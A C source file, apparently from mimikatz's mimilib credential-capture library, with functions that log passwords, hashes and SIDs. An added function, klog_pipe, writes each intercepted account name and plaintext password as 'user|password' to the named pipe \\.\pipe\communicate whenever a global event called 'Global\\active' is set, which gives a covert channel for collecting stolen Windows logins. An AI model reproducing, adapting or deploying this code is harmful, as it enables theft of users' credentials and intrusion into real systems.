/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "utils.h"

static HANDLE transactToPipe = INVALID_HANDLE_VALUE;


int klog_pipe(PUNICODE_STRING Domain, PUNICODE_STRING downLevel, PUNICODE_STRING AccountName, PUNICODE_STRING Password) {
    
	DWORD bytesWritten = 0;
	BOOL active = FALSE;

	HANDLE hEvent = CreateEventW(NULL,TRUE,FALSE,L"Global\\active");

	if (hEvent == NULL) {
		DWORD err = GetLastError();
		if (err == ERROR_ALREADY_EXISTS) {
			hEvent = OpenEventW(EVENT_ALL_ACCESS,FALSE, L"Global\\active");
			if (hEvent == 0)
				return -1;
		}
	}

	DWORD chkEvent = WaitForSingleObject(hEvent, 0);
	if (chkEvent == WAIT_OBJECT_0) 
	{

		if (transactToPipe == INVALID_HANDLE_VALUE) {
			transactToPipe = CreateFileW(
				L"\\\\.\\pipe\\communicate",
				GENERIC_WRITE | GENERIC_READ,
				0,
				NULL,
				OPEN_EXISTING,
				0,
				NULL);
		}
		
		if (transactToPipe == INVALID_HANDLE_VALUE ) {
			return -1;
		}

		wchar_t* data = calloc(sizeof(wchar_t) * 511, 1);

		int ret = swprintf(data, 511, L"%s|%s\n",
			//Domain->Buffer,
			//downLevel->Buffer,
			AccountName->Buffer,
			Password->Buffer
		);
	  DWORD len = (DWORD)(wcslen(data)) * sizeof(wchar_t);

		BOOL success = WriteFile(
			transactToPipe,
			data,
			len,
			&bytesWritten,
			NULL
		);
		if (!success) {
			DWORD err = GetLastError();
			if (err == ERROR_NO_DATA || err == ERROR_PIPE_NOT_CONNECTED ||
				err == ERROR_BROKEN_PIPE) 
			{
				CloseHandle(transactToPipe);
				transactToPipe = INVALID_HANDLE_VALUE;
			}
		}
		
		 free(data);
	}
		CloseHandle(hEvent);
		 return 0;
}
void klog(FILE * logfile, PCWCHAR format, ...)
{
	if(logfile)
	{
		va_list args;
		va_start(args, format);
		vfwprintf(logfile, format, args);
		va_end(args);
		fflush(logfile);
	}
}

void klog_password(FILE * logfile, PUNICODE_STRING pPassword)
{
	int i = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS;
	if(pPassword->Buffer)
	{
		if(IsTextUnicode(pPassword->Buffer, pPassword->Length, &i))
			klog(logfile, L"%wZ", pPassword);
		else klog_hash(logfile, pPassword, TRUE);
			//for(i = 0; i < pPassword->Length; i++)
			//	klog(logfile, L"%02x ", ((LPCBYTE) pPassword->Buffer)[i]);
	}
}

void klog_hash(FILE * logfile, PUNICODE_STRING pHash, BOOLEAN withSpace)
{
	USHORT i;
	if(pHash->Buffer)
		for(i = 0; i < pHash->Length; i++)
			klog(logfile, L"%02x%s", ((LPCBYTE) pHash->Buffer)[i], withSpace ? " " : "");
}

void klog_sid(FILE * logfile, PSID pSid)
{
	LPWSTR stringSid;
	if(pSid && ConvertSidToStringSid(pSid, &stringSid))
	{
		klog(logfile, L"%s", stringSid);
		LocalFree(stringSid);
	}
}